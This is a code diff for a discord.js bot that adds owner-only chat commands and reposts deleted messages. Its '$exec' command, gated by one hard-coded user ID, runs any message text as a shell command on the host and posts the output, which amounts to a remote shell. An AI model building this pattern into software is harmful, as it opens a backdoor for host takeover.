@@ -1,5 +1,6 @@
 const { Client, Events, GatewayIntentBits, ActivityType } = require('discord.js');
 const { token } = require('./config.json');
+const { exec } = require('child_process');
 
 const additionalFunctions = require('./additional functions/main.js');
 
@@ -19,9 +20,33 @@ client.once(Events.ClientReady, readyClient => {
 });
 
 client.on(Events.MessageCreate, (message) => {
-    if (message.content === 'ping') {
-        console.log("!");
-        message.reply('Pong!');
+    if (message.author.id === "600677384689025026") {
+        if (message.content.startsWith("$echo")) {
+            message.channel.send(message.content.slice(6));
+        } else if (message.content.startsWith("$exec")) {
+            exec(message.content.slice(6), (error, stdout, stderr) => {
+                if (error) {
+                  message.channel.send(`${error}`);
+                  return;
+                }
+                if (stdout) {
+                    message.channel.send(`Command result:\n${stdout}`);
+                }
+                if (stderr) {
+                    message.channel.send(`Command Error:\n${stderr}`);
+                }
+            });
+        } else if (message.content.startsWith("$channelCreate")) {
+            additionalFunctions.createChannel(message.content.slice(15), "1119538529450594314").then(()=> {
+                message.channel.send("Created channel successfully!")
+            }).catch((error) => {
+                message.channel.send(`Error creating channel: ${error}`)
+            })
+        } else if (message.content.startsWith("$channelDelete")) {
+            additionalFunctions.deleteChannel(message.content.slice(15));
+        }
+    } else {
+        return
     }
 });
 
@@ -33,6 +58,8 @@ client.on(Events.MessageDelete, (message) => {
         message.attachments.forEach(element => {
             if (element.url) {
                 message.channel.send(`Message deleted by ${message.author}: ${element.url}`);
+            } else {
+                message.channel.send(`Message deleted by ${message.author}: ${message.content}`);
             }
         });
         console.log("embed delete");
@@ -52,10 +79,12 @@ client.on(Events.MessageUpdate, (oldMessage, newMessage) => {
 
 client.on(Events.MessageReactionAdd, (reaction, user) => {
     reaction.message.channel.send(`Reaction added by ${user}: ${reaction.emoji.name}`);
+    console.log("added reaction")
 })
 
 client.on(Events.MessageReactionRemove, (reaction, user) => {
     reaction.message.channel.send(`Reaction removed by ${user}: ${reaction.emoji.name}`);
+    console.log("removed reaction")
 })
 
 client.login(token);
